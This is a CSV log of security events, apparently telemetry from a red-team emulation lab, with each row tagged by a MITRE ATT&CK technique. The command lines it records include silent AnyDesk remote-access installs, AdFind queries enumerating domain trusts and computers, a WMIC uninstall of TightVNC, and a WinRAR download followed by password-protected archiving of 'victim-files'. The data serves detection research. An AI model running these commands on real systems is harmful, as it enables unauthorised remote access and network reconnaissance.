"T1560.001","2025-04-05T23:40:16.438888000Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1219","2025-04-05T23:40:11.454248000Z","2","","","22"
"T1219","2025-04-05T23:40:06.877515500Z","2","","","22"
"T1219","2025-04-05T23:39:25.938126300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:39:00.535207800Z","2","","","22"
"T1053.005","2025-04-05T23:38:51.527068600Z","2","","","99"
"T1027.004","2025-04-05T23:38:37.487153400Z","2"," powershell","\Users\Administrator\AppData\Local\Temp\bbrlehr4\bbrlehr4.cmdline""","1"
"T1219","2025-04-05T23:38:25.550430500Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:37:40.855858800Z","2","","","22"
"T1219","2025-04-05T23:37:25.625721600Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:36:48.053431400Z","2","","","22"
"T1219","2025-04-05T23:36:25.544312900Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:35:48.190054500Z","2","","","22"
"T1219","2025-04-05T23:35:25.958137600Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:34:50.503965200Z","2","","","22"
"T1219","2025-04-05T23:34:25.974248500Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:33:44.353280300Z","2","","","22"
"T1219","2025-04-05T23:33:25.988758200Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:32:47.455727100Z","2","","","22"
"T1219","2025-04-05T23:32:26.173408200Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:31:55.466823800Z","2","","","22"
"T1219","2025-04-05T23:31:37.934206900Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-05T23:31:37.694530100Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-05T23:31:36.671928300Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1219","2025-04-05T23:31:34.198702000Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1219","2025-04-05T23:31:26.072436300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:30:53.344025400Z","2","","","22"
"T1219","2025-04-05T23:30:26.267941000Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:29:47.419446900Z","2","","","22"
"T1219","2025-04-05T23:29:26.115540100Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1087.002","2025-04-05T23:29:03.335202400Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" None -gcb -sc trustdmp","1"
"T1219","2025-04-05T23:28:39.382881700Z","2","","","22"
"T1219","2025-04-05T23:28:26.164569000Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:27:42.282179200Z","2","","","22"
"T1219","2025-04-05T23:27:26.100392200Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1560.001","2025-04-05T23:27:20.815989200Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C if not exist "".\tmp\victim-files"" mkdir .\tmp\victim-filescd .\tmp\victim-filesecho This file will be encrypted > .\encrypted_file.txt""%programfiles%\WinRAR\Rar.exe"" a -hp""blue"" hello.rardir","1"
"T1219","2025-04-05T23:26:44.156441500Z","2","","","22"
"T1219","2025-04-05T23:26:28.137018300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:25:48.300469000Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-05T23:25:47.991474000Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","1"
"T1219","2025-04-05T23:25:44.372231500Z","2","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1219","2025-04-05T23:25:41.355047800Z","3","username + \""\Desktop\AnyDesk.exe\""; Start-Process $file1 /S;""","","1"
"T1219","2025-04-05T23:25:28.994113200Z","2","","","22"
"T1219","2025-04-05T23:25:25.973964100Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:24:26.104043300Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:24:20.060679600Z","2","","","22"
"T1219","2025-04-05T23:23:25.674065600Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:23:22.637405700Z","2","","","22"
"T1087.002","2025-04-05T23:23:09.366580200Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" None -gcb -sc trustdmp","1"
"T1219","2025-04-05T23:22:29.327118200Z","2","","","22"
"T1219","2025-04-05T23:22:29.192538800Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1560.001","2025-04-05T23:21:45.290431500Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C mkdir .\tmp\victim-files && cd .\tmp\victim-files && echo ""This file will be encrypted"" > .\encrypted_file.txt && ""%programfiles%/WinRAR/Rar.exe"" a -hp""blue"" hello.rar && dir","1"
"T1219","2025-04-05T23:21:26.544796400Z","2","","","22"
"T1219","2025-04-05T23:21:26.098973400Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:20:33.790837100Z","2","","","22"
"T1219","2025-04-05T23:20:26.342496000Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:19:25.944904500Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:19:22.845649800Z","2","","","22"
"T1219","2025-04-05T23:18:25.760044100Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:18:13.391647200Z","2","","","22"
"T1219","2025-04-05T23:18:12.636431000Z","2","","","22"
"T1219","2025-04-05T23:18:12.333395100Z","2","","","22"
"T1219","2025-04-05T23:18:12.040184800Z","2","","","22"
"T1219","2025-04-05T23:18:11.750816400Z","2","","","22"
"T1219","2025-04-05T23:18:11.398682900Z","2","","","22"
"T1047","2025-04-05T23:17:51.812186200Z","2","""127.0.0.1"" product where ""name like 'Tightvnc%%'"" call uninstall","""127.0.0.1"" product where ""name like 'Tightvnc%%'"" call uninstall","1"
"T1219","2025-04-05T23:17:33.290285900Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:17:32.954490200Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:17:29.087609000Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:17:28.619001200Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:17:27.440515500Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:17:25.459578900Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:16:32.904320200Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1087.002","2025-04-05T23:16:13.802189800Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C ""$PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=subnet) None","1"
"T1219","2025-04-05T23:16:12.668396400Z","2","","","22"
"T1219","2025-04-05T23:15:32.852287600Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:15:09.040304800Z","2","","","22"
"T1219","2025-04-05T23:14:32.641812100Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:14:11.177038100Z","2","","","22"
"T1219","2025-04-05T23:13:32.944775900Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1087.002","2025-04-05T23:13:18.844688200Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" None -gcb -sc trustdmp","1"
"T1087.002","2025-04-05T23:13:16.114029800Z","3","//ts-caldera.tailce1ce1.ts.net -group red "," cmd.exe /C ""$PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=computer) None","1"
"T1219","2025-04-05T23:13:01.299243100Z","2","","","22"
"T1219","2025-04-05T23:12:33.154525900Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:12:01.029417700Z","2","","","22"
"T1219","2025-04-05T23:12:00.587645400Z","2","","","22"
"T1219","2025-04-05T23:11:32.895431600Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1560.001","2025-04-05T23:10:59.972834800Z","3","//ts-caldera.tailce1ce1.ts.net -group red ","//www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe"" %TEMP%\winrar.exe && %TEMP%\winrar.exe /S) &&   &&mkdir .\tmp\victim-files && cd .\tmp\victim-files && echo ""This file will be encrypted"" > .\encrypted_file.txt && ""%programfiles%/WinRAR/Rar.exe"" a -hp""blue"" hello.rar && dir","1"
"T1053.005","2025-04-05T23:10:54.848407800Z","2","","","99"
"T1053.005","2025-04-05T23:10:53.704337600Z","2","","","99"
"T1053.005","2025-04-05T23:10:51.757673500Z","2","","","99"
"T1053.005","2025-04-05T23:10:51.540093600Z","2","","","99"
"T1053.005","2025-04-05T23:10:51.247137700Z","2","","","99"
"T1053.005","2025-04-05T23:10:50.485628900Z","2","","","99"
"T1219","2025-04-05T23:10:32.378636900Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:09:59.286623000Z","2","","","22"
"T1219","2025-04-05T23:09:59.101952200Z","2","","","22"
"T1219","2025-04-05T23:09:58.845817300Z","2","","","22"
"T1219","2025-04-05T23:09:58.670629600Z","2","","","22"
"T1219","2025-04-05T23:09:58.513779600Z","2","","","22"
"T1219","2025-04-05T23:09:58.250823000Z","2","","","22"
"T1562.004","2025-04-05T23:09:57.467157400Z","2","","","99"
"T1562.004","2025-04-05T23:09:54.788837900Z","2","","","99"
"T1219","2025-04-05T23:09:46.197339900Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:09:45.873594800Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:09:41.166314700Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:09:40.653175400Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:09:35.130143400Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
"T1219","2025-04-05T23:09:32.270805800Z","2","\Users\Administrator\Desktop\AnyDesk.exe"" /S ","\Users\Administrator\Desktop\AnyDesk.exe"" --local-service","11"
